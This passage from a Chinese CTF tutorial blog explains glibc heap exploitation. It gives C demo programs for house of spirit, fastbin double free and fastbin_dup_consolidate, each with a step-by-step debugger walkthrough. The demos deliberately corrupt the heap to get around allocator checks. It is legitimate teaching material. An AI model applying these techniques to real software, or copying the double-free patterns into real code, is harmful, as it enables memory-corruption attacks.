                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_M9SHEHDCSMPZBD7.png"
                     
                ><br>在0x4007A7其fd，bk指向main_arena+x58的位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2PFN7JA5YKTQ3WJ.png"
                     
                ><br>这里把var_28位置写为0x110。IDA里这个var_28中的0x28是16进制的偏移。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XUU37A7TTNM9CTE.png"
                     
                ><br>这里把rax指向ptr-8的位置，特就是size处。然后将其改为0x20。unsorted bin有FIFO特性，下次申请0x100大小不会找到它。然后将ptr+8的位置指向var_30，也就是把ptr的bk指针指向var_0x28+0x8的位置（bk指向后进入unsorted bin的chunk），var_0x28&#x3D;0x110，也就是伪造的chunk大小，var_30也就是prev_size的位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7FFXHQMZJZJ6VD9.png"
                     
                ><br>在0x40081C下断点，可见ptr的bk指向栈。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_X8QF98YVC2Y7HSR.png"
                     
                ><br>查看0x602410内存可见ptr的size位置被改为了0x20<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_RNY3WYAWYJ7DY93.png"
                     
                ><br>接下来申请0x100大小的chunk将会去unsorted bin寻找0x110大小的chunk，ptr已被改为0x20大小，所以跳过ptr申请到了栈上伪造的var_30处chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4R6P2X9QDR3K5EQ.png"
                     
                ><br>在0x40082B处下断点，可见malloc后，unsorted被整理，0x20大小的ptr放进了small bin。fd和bk都指向main_arena+104处。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CFQPP2ZXM4P7YKJ.png"
                     
                ><br>申请成功。</p>
<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="built_in">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu16.04编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><p>初始化堆。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091755981-1695348432658-25.png"
                      alt="image-20230922091755981"
                ></p>
<p>在<code>0x400703</code>处下断点查看堆结构。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091916522-1695348571707-28.png"
                     
                ><br>栈中数组结构。<code>fake_chunks_size = 0x40</code>，<code>fake_chunks_next_size = 0x1234</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092146583-1695348610428-32.png"
                      alt="image-20230922092146583"
                ><br>将 <code>a</code> 指向<code>fake_chunks_fd</code>，然后 <code>free(a)</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092342656-1695348634598-36.png"
                      alt="image-20230922092342656"
                ><br>成功将栈地址放入 <code>fastbins</code> 中。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092506302-1695348654255-39.png"
                      alt="image-20230922092506302"
                ><br>那麽此时申请0x30大小的空间会在fastbins中寻找0x40大小的chunk，便可成功申请到栈上。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092715145-1695348671021-42.png"
                      alt="image-20230922092715145"
                ></p>
<h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><ul>
<li>fast bin attack<br>例题1：<a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1817311-1-1.html" >0CTF2017:babyheap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>unsafe unlink<br>例题2：<a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn//thread-1820017-1-1.html" >HITCON CTF 2016 : Secret Holdr <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>例题3：<a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1825577-1-1.html" >HITCON CTF 2016 : SleepyHolder <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-4"><a href="#调试-4" class="headerlink" title="调试"></a>调试</h3><p>使用ubuntu:16.04编译，<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XWR593Z6QWM678A.png"
                     
                ><br>然后使用pwncli修改运行环境。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_HFXM6UD3SRQFGMH.png"
                      alt="图片描述"
                ><br>malloc三次相同大小的堆块后，在0x400700下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2EGACEX74TU3QRY.png"
                      alt="图片描述"
                ><br>观察堆结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_24PJANS2GM8MB2P.png"
                      alt="图片描述"
                ><br>依次释放堆块a,b后，在0x4007CF下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_A2SCWXK32FJK626.png"
                      alt="图片描述"
                ><br>观察fastbin结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5KFTD8D4QBYUZRY.png"
                      alt="图片描述"
                ><br>再次释放a,形成double free后，在0x4007F8下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JZ24RST96TR5RPJ.png"
                      alt="图片描述"
                ><br>观察fastbin结构，已经形成ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_782YNCGZFNYW8QR.png"
                      alt="图片描述"
                ><br>此时依次申请a,b,c三个相应大小的堆块，将会依次摘出a,b,a,<br>fastbin中a-&gt;b-&gt;a-&gt;b…这条链子会一直存在，不断从头部取出相应大小的堆块。<br>申请a后，在0x400835下断点（rax保存了_malloc函数的返回值）。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QA4NT4K533CQDKZ.png"
                      alt="图片描述"
                ><br>此时fastbin结构，形成了BAB结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRGPNNXAJD7C2F9.png"
                      alt="图片描述"
                ><br>同样，申请完b后在0x400843下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PTP2U3KSVCT74TK.png"
                      alt="图片描述"
                ><br>此时fastbin结构，又形成了ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4CQ4CJAZSCH7WU.png"
                      alt="图片描述"
                ><br>同样申请完c后在0x400851下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CR3CMBC9VJWUDT3.png"
                      alt="图片描述"
                ><br>此时fastbin结构，再次形成BAB结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KSXPFGVAYV5H9YZ.png"
                      alt="图片描述"
                ><br>此时a和c指向同一地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4MZWDG2C8F3WEA.png"
                      alt="图片描述"
                ></p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p1 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p4 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04编译并使用pwncli改写rpath。
</code></pre>
<h3 id="调试-5"><a href="#调试-5" class="headerlink" title="调试"></a>调试</h3><p>calloc p1堆块后，在0x4006C5处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KQEQ32B3NMRVFSC.png"
                      alt="图片描述"
                ><br>查看堆结构， 可以看到多出来一块0x411大小的堆块。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PVC2FBRWP9GF7A.png"
                      alt="图片描述"
                ><br>这个堆块是puts的缓冲区。puts函数用于将字符串输出到标准输出流（stdout），而标准输出流是一个文件流，需要在内存中分配一块缓冲区来存储输出的字符串，下图是其分配过程。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XG85YQF9NY28T7S.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6QS2Z3FCJEQPXMR.png"
                      alt="图片描述"
                ><br>free(p1)后，p1会优先进入fastbins。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YG6FJ2KF3VB4U26.png"
                      alt="图片描述"
                ><br>再次申请0x400（实际大小为0x410）的chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Y7DJTKGEFQFGFGA.png"
                      alt="图片描述"
